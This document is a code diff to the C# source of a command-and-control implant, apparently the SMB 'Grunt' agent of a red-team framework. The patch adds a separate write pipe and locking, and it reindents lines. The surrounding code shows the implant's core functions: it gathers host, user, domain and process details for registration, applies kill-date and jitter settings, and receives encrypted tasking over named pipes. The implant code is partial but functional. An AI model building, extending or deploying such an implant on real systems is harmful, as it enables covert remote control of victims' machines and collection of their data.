@@ -17,7 +17,7 @@ namespace GruntExecutor
 {
     class Grunt
     {
-        public static void Execute(string GUID, Aes SessionKey, NamedPipeServerStream ServerPipe = null, string PipeName = null)
+        public static void Execute(string GUID, Aes SessionKey, NamedPipeServerStream ServerPipe = null, NamedPipeServerStream ServerPipeWrite = null, string PipeName = null)
         {
             try
             {
@@ -25,9 +25,9 @@ namespace GruntExecutor
                 int Jitter = Convert.ToInt32(@"{{REPLACE_JITTER_PERCENT}}");
                 int ConnectAttempts = Convert.ToInt32(@"{{REPLACE_CONNECT_ATTEMPTS}}");
                 DateTime KillDate = DateTime.FromBinary(long.Parse(@"{{REPLACE_KILL_DATE}}"));
-				
-				string ProfileReadFormat = @"{{REPLACE_PROFILE_READ_FORMAT}}".Replace(Environment.NewLine, "\n");
-				string ProfileWriteFormat = @"{{REPLACE_PROFILE_WRITE_FORMAT}}".Replace(Environment.NewLine, "\n");
+
+                string ProfileReadFormat = @"{{REPLACE_PROFILE_READ_FORMAT}}".Replace(Environment.NewLine, "\n");
+                string ProfileWriteFormat = @"{{REPLACE_PROFILE_WRITE_FORMAT}}".Replace(Environment.NewLine, "\n");
 
                 string Hostname = Dns.GetHostName();
                 string IPAddress = Dns.GetHostAddresses(Hostname)[0].ToString();
@@ -59,7 +59,7 @@ namespace GruntExecutor
 
                 string RegisterBody = @"{ ""integrity"": " + Integrity + @", ""process"": """ + Process + @""", ""userDomainName"": """ + UserDomainName + @""", ""userName"": """ + UserName + @""", ""delay"": " + Convert.ToString(Delay) + @", ""jitter"": " + Convert.ToString(Jitter) + @", ""connectAttempts"": " + Convert.ToString(ConnectAttempts) + @", ""status"": 0, ""ipAddress"": """ + IPAddress + @""", ""hostname"": """ + Hostname + @""", ""operatingSystem"": """ + OperatingSystem + @""" }";
                 IMessenger baseMessenger = null;
-                baseMessenger = new SMBMessenger(ServerPipe, PipeName);
+                baseMessenger = new SMBMessenger(ServerPipe, ServerPipeWrite, PipeName);
                 baseMessenger.Identifier = GUID;
                 TaskingMessenger messenger = new TaskingMessenger
                 (
@@ -415,13 +415,13 @@ namespace GruntExecutor
     {
         private string ReadFormat { get; }
         private string WriteFormat { get; }
-		private string Guid { get; set; }
+        private string Guid { get; set; }
 
-		public Profile(string ReadFormat, string WriteFormat, string Guid)
+        public Profile(string ReadFormat, string WriteFormat, string Guid)
         {
             this.ReadFormat = ReadFormat;
             this.WriteFormat = WriteFormat;
-			this.Guid = Guid;
+            this.Guid = Guid;
         }
 
         public GruntEncryptedMessage ParseReadFormat(string Message) { return Parse(this.ReadFormat, Message); }
@@ -452,6 +452,7 @@ namespace GruntExecutor
     public class TaskingMessenger
     {
         private object _UpstreamLock = new object();
+        private object _UpstreamLockW = new object();
         private IMessenger UpstreamMessenger { get; set; }
         private object _MessageQueueLock = new object();
         private Queue<string> MessageQueue { get; } = new Queue<string>();
@@ -484,7 +485,7 @@ namespace GruntExecutor
                 return null;
             }
             GruntEncryptedMessage gruntMessage = null;
-            if (readMessage.Type == MessageType.Read) 
+            if (readMessage.Type == MessageType.Read)
             {
                 gruntMessage = this.Profile.ParseReadFormat(readMessage.Message);
             }
@@ -528,7 +529,7 @@ namespace GruntExecutor
         {
             try
             {
-                lock (_UpstreamLock)
+                lock (_UpstreamLockW)
                 {
                     lock (_MessageQueueLock)
                     {
@@ -631,6 +632,14 @@ namespace GruntExecutor
             set { lock (this._PipeLock) { this._Pipe = value; } }
         }
 
+        private object _PipeWriteLock = new object();
+        private PipeStream _PipeWrite;
+        private PipeStream PipeWrite
+        {
+            get { lock (this._PipeWriteLock) { return this._PipeWrite; } }
+            set { lock (this._PipeWriteLock) { this._PipeWrite = value; } }
+        }
+
         protected object _IsConnectedLock = new object();
         private bool _IsConnected;
         public bool IsConnected
@@ -647,9 +656,10 @@ namespace GruntExecutor
             this.InitializePipe();
         }
 
-        public SMBMessenger(PipeStream Pipe, string Pipename)
+        public SMBMessenger(PipeStream Pipe, PipeStream PipeWrite, string Pipename)
         {
             this.Pipe = Pipe;
+            this.PipeWrite = PipeWrite;
             this.PipeName = Pipename;
             this.IsServer = true;
             if (Pipe != null && Pipe.IsConnected)
@@ -794,12 +804,12 @@ namespace GruntExecutor
             size[1] = (byte)(compressed.Length >> 16);
             size[2] = (byte)(compressed.Length >> 8);
             size[3] = (byte)compressed.Length;
-            this.Pipe.Write(size, 0, size.Length);
+            this.PipeWrite.Write(size, 0, size.Length);
             var writtenBytes = 0;
             while (writtenBytes < compressed.Length)
             {
                 int bytesToWrite = Math.Min(compressed.Length - writtenBytes, 1024);
-                this.Pipe.Write(compressed, writtenBytes, bytesToWrite);
+                this.PipeWrite.Write(compressed, writtenBytes, bytesToWrite);
                 writtenBytes += bytesToWrite;
             }
         }
@@ -905,7 +915,7 @@ namespace GruntExecutor
             if (parseList.Count < 3) { return null; }
             return new GruntTaskingMessage
             {
-				Type = (GruntTaskingType)Enum.Parse(typeof(GruntTaskingType), parseList[0], true),
+                Type = (GruntTaskingType)Enum.Parse(typeof(GruntTaskingType), parseList[0], true),
                 Name = parseList[1],
                 Message = parseList[2],
                 Token = Convert.ToBoolean(parseList[3])
@@ -962,12 +972,12 @@ namespace GruntExecutor
             Tasking
         }
 
-		public string GUID { get; set; } = "";
+        public string GUID { get; set; } = "";
         public GruntEncryptedMessageType Type { get; set; }
         public string Meta { get; set; } = "";
-		public string IV { get; set; } = "";
-		public string EncryptedMessage { get; set; } = "";
-		public string HMAC { get; set; } = "";
+        public string IV { get; set; } = "";
+        public string EncryptedMessage { get; set; } = "";
+        public string HMAC { get; set; } = "";
 
         public bool VerifyHMAC(byte[] Key)
         {
@@ -986,7 +996,7 @@ namespace GruntExecutor
         private static string GruntEncryptedMessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
         public static GruntEncryptedMessage FromJson(string message)
         {
-			List<string> parseList = Utilities.Parse(message, GruntEncryptedMessageFormat);
+            List<string> parseList = Utilities.Parse(message, GruntEncryptedMessageFormat);
             if (parseList.Count < 5) { return null; }
             return new GruntEncryptedMessage
             {
@@ -1119,7 +1129,7 @@ namespace GruntExecutor
         public static List<string> Parse(string data, string format)
         {
             format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
-			if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
+            if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
             if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
             if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
             if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
@@ -1127,7 +1137,7 @@ namespace GruntExecutor
             if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
             Match match = new Regex(format).Match(data);
             List<string> matches = new List<string>();
-			if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
+            if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
             if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
             if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
             if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
